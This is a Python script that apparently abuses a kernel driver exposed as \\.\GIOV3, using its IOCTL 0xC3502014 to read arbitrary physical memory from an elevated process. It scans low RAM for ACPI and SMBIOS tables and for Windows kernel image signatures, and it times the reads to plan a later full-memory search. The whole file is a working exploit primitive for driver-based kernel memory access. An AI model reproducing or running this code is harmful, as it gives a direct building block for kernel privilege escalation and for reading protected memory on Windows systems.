"""mem_scan.py -- prove the 0xC3502014 physical read returns real content.

elev_probe used 0xC3502400, which turned out to be a 4-byte "echo" function, so
its all-zero output proved nothing.  read_probe showed 0xC3502014 really does
memcpy(phys_page, dst, size) (a 0xAA-filled dst became 0x00 at phys 0x400 and
0xFF at phys 0xF0000).  This scan looks for signatures that cannot be faked:

    "RSD PTR "   ACPI RSDP (EBDA / 0xE0000-0xFFFFF, sometimes >1 MiB)
    "_SM_"       SMBIOS 32-bit entry point      (0xF0000-0xFFFFF)
    "_SM3_"      SMBIOS 64-bit entry point
    "ntoskrnl.exe" inside the kernel image (definitive: kernel phys pages)
    "MZ" + "PE\\0\\0" at page starts = loaded PE images

It also reports throughput so we can size a full-memory search later.
"""
import ctypes
import os
import struct
import sys
import time

import elev_probe as E

OUT = os.path.join(E.HERE, "mem_scan.txt")
IOCTL_READ = 0xC3502014          # {u64 phys; u32 size; u32 pad; void *dst}

SIGS = [(b"RSD PTR ", "ACPI RSDP"),
        (b"_SM3_", "SMBIOS3"),
        (b"_SM_", "SMBIOS"),
        (b"ntoskrnl.exe", "ntoskrnl image"),
        (b"win32k.sys", "win32k image"),
        (b"hal.dll", "hal")]


def open_gdrv():
    for av in (E.GENERIC_READ | E.GENERIC_WRITE, 0):
        h = E.k32.CreateFileW(r"\\.\GIOV3", av, 3, None, E.OPEN_EXISTING, 0,
                              None)
        if h and h != E.INVALID_HANDLE_VALUE:
            return h
    return None


class Reader(object):
    """Reusable locked scratch page + a cached handle."""

    def __init__(self, h, chunk=0x10000):
        self.h = h
        self.chunk = chunk
        self.dst = E.alloc_locked(chunk)
        self.calls = 0
        self.bytes = 0
        self.ok_calls = 0

    def read(self, phys, size=None):
        size = size or self.chunk
        ib = ctypes.create_string_buffer(0x20)
        struct.pack_into("<QIIQ", ib, 0, phys, size, 0, self.dst)
        ob = ctypes.create_string_buffer(1)
        ret = ctypes.c_ulong(0)
        ok = E.k32.DeviceIoControl(self.h, IOCTL_READ, ib, 0x18, ob, 0, 
                                   ctypes.byref(ret), None)
        self.calls += 1
        if not ok:
            return False, b""
        self.ok_calls += 1
        self.bytes += size
        return True, ctypes.string_at(self.dst, size)

    def close(self):
        E.k32.VirtualFree(self.dst, 0, E.MEM_RELEASE)


def interesting(data, phys, log, tag):
    for sig, name in SIGS:
        off = data.find(sig)
        while off >= 0:
            log("  [%s] %-14s at phys %#x (page %#x +%#x)"
                % (tag, name, phys + off, (phys + off) & ~0xFFF,
                   (phys + off) & 0xFFF))
            off = data.find(sig, off + 1)


def scan(rd, start, end, log, tag, chunk=None, samples=0):
    """Walk [start,end) in chunks, logging signatures and nonzero density."""
    chunk = chunk or rd.chunk
    t0 = time.time()
    nonzero_pages = 0
    pages = 0
    shown = 0
    phys = start
    while phys < end:
        ok, data = rd.read(phys, chunk)
        if not ok:
            log("  [%s] read %#x FAILED err=%d"
                % (tag, phys, ctypes.get_last_error()))
            phys += chunk
            continue
        if any(data):
            interesting(data, phys, log, tag)
        for off in range(0, len(data), 0x1000):
            pages += 1
            page = data[off:off + 0x1000]
            if any(page):
                nonzero_pages += 1
                if shown < samples:
                    shown += 1
                    log("  [%s] nonzero page phys %#x (%d/4096 set)"
                        % (tag, phys + off, sum(1 for b in page if b)))
                    for ln in E.hexdump(page, phys + off, limit=0x40):
                        log("    " + ln)
        phys += chunk
    dt = time.time() - t0
    mb = (end - start) / 1048576.0
    log("  [%s] %#x-%#x: %d/%d pages nonzero, %.1f MiB in %.2fs (%.1f MiB/s)"
        % (tag, start, end, nonzero_pages, pages, mb, dt, mb / max(dt, 1e-6)))
    return nonzero_pages


def elevated_main():
    fh = open(OUT, "w", encoding="utf-8")

    def log(s=""):
        fh.write(s + "\n")
        fh.flush()
        print(s)

    log("=== mem_scan pid=%d elevation=%s ioctl=%#x"
        % (os.getpid(), E.elevation(), IOCTL_READ))
    h = open_gdrv()
    if not h:
        log("cannot open \\\\.\\GIOV3 err=%d" % ctypes.get_last_error())
        fh.close()
        return 1
    rd = Reader(h)
    # a zero page only means something if 0xAA was really overwritten first
    ctypes.memset(rd.dst, 0xAA, rd.chunk)
    ok, data = rd.read(0xF0000, 0x1000)
    log("prefill test phys 0xF0000: ok=%s first16=%s (no 0xAA => written)"
        % (ok, data[:16].hex()))
    # Conventional RAM only: 0x0-0xA0000 is guaranteed backed.
    # Do NOT sweep past 0xA0000 blind -- 0xA0000-0x100000 is video/BIOS MMIO and
    # above 1 MiB there are holes; MmMapIoSpace on an unbacked range bugchecks.
    scan(rd, 0x00000000, 0x000A0000, log, "lowRAM", 0x1000, samples=4)
    log("throughput: %d ioctls, %d ok, %.1f MiB"
        % (rd.calls, rd.ok_calls, rd.bytes / 1048576.0))
    rd.close()
    E.k32.CloseHandle(h)
    fh.close()
    return 0


def main():
    elev, rid = E.elevation()
    print("parent: elevated=%s rid=%#x" % (elev == 1, rid))
    if elev == 1 or "--elevated" in sys.argv:
        return elevated_main()
    print(E.run_elevated(os.path.abspath(__file__)))
    if os.path.exists(OUT):
        print(open(OUT, encoding="utf-8").read())
    return 0


if __name__ == "__main__":
    sys.exit(main())
